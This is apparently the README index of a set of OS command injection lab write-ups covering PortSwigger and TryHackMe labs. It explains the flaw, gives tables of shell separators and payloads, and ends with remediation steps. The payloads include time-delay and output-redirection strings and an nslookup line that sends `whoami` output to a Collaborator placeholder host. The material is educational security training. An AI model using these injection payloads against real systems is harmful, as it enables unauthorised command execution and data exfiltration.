# 05 — OS Command Injection

Professional PoC writeups for the **OS Command Injection** (a.k.a. Shell Injection) category, covering PortSwigger Web Security Academy labs and a supplementary TryHackMe practical room.

> CWE-78 — Improper Neutralization of Special Elements used in an OS Command
> OWASP Top 10:2025 — A05: Injection

---

## What is OS Command Injection?

OS command injection occurs when an application passes unsanitised, user-controlled input into a function that executes commands on the underlying operating system shell (e.g. PHP `exec()`/`system()`/`shell_exec()`/`passthru()`, Python `subprocess`, Node.js `child_process.exec()`, Java `Runtime.exec()`). An attacker can use shell metacharacters to terminate the intended command and inject arbitrary commands of their own, which then execute with the same privileges as the vulnerable application.

Two broad detection/exploitation classes are covered across these labs:

- **In-band (verbose) injection** — the output of the injected command is reflected directly in the HTTP response.
- **Blind injection** — no output is returned, and the vulnerability must be confirmed/exploited indirectly via time delays, output redirection into a web-accessible path, or out-of-band (OAST) interactions such as DNS lookups.

---

## 📂 Labs Covered

| # | Lab | Difficulty | Technique | Writeup |
|---|---|---|---|---|
| 01 | OS command injection, simple case | Apprentice | In-band / verbose | [Lab-01-Simple-Case.md](./Lab-01-Simple-Case.md) |
| 02 | Blind OS command injection with time delays | Practitioner | Blind — time-based (`ping`) | [Lab-02-Blind-Time-Delays.md](./Lab-02-Blind-Time-Delays.md) |
| 03 | Blind OS command injection with output redirection | Practitioner | Blind — output redirection (`>`) | [Lab-03-Blind-Output-Redirection.md](./Lab-03-Blind-Output-Redirection.md) |
| 04 | Blind OS command injection with out-of-band interaction | Practitioner | Blind — OAST (DNS via Burp Collaborator) | [Lab-04-Blind-OOB-Interaction.md](./Lab-04-Blind-OOB-Interaction.md) |
| 05 | Blind OS command injection with out-of-band data exfiltration | Practitioner | Blind — OAST data exfiltration (inline command substitution) | [Lab-05-Blind-OOB-Data-Exfiltration.md](./Lab-05-Blind-OOB-Data-Exfiltration.md) |
| — | TryHackMe: OS Command Injection (room practical) | N/A | In-band, live target, flag capture | [THM-Command-Injection-Practical.md](./THM-Command-Injection-Practical.md) |

---

## 🧰 Quick Reference — Shell Metacharacters

| Separator | Behaviour | Platform |
|---|---|---|
| `;` | Runs the next command regardless of the first's exit status | Unix/Linux only |
| `\n` (0x0a) | Newline — ends one command, starts the next | Unix/Linux only |
| `&` | Runs the first command in the background, then the next | Linux & Windows |
| `&&` | Runs the next command only if the first **succeeds** | Linux & Windows |
| `\|` | Pipes the first command's output as input to the second | Linux & Windows |
| `\|\|` | Runs the next command only if the first **fails** | Linux & Windows |
| `` `cmd` `` / `$(cmd)` | Inline execution — substitutes the command's output in place | Unix/Linux only |

## 🧰 Quick Reference — Detection & Exploitation

| Scenario | Technique | Example Payload |
|---|---|---|
| In-band | Reflect output directly | `1\|whoami` |
| Blind | Time delay | `x\|\|ping -c 10 127.0.0.1\|\|` (Linux) / `& ping -n 10 127.0.0.1 &` (Windows) |
| Blind | Output redirection to a writable web-served path | `\|\|whoami>/var/www/images/output.txt\|\|` |
| Blind (async, no writable path) | OAST — trigger DNS interaction | `\|\|nslookup x.COLLABORATOR-SUBDOMAIN\|\|` |
| Blind (async, no writable path) | OAST — exfiltrate data via DNS | `` \|\|nslookup `whoami`.COLLABORATOR-SUBDOMAIN\|\| `` |

## 🛡️ Remediation Summary

1. **Avoid OS shell calls entirely** — use safe platform/language APIs instead of shelling out.
2. If unavoidable, **never build commands via string concatenation** — pass arguments as an array/parameter list (e.g. `execFile()`, `ProcessBuilder`) so the shell never re-interprets metacharacters.
3. **Allowlist validation** — restrict input to an expected format (numeric-only, alphanumeric-only, fixed set of values); don't rely on blacklisting or escaping metacharacters.
4. Apply **defence in depth**: least-privilege service accounts, no writable directories inside the web root, and egress filtering to limit OAST-style exfiltration.

## 📚 References

- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [TryHackMe — OS Command Injection room](https://tryhackme.com/)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Top 10](https://owasp.org/Top10/)
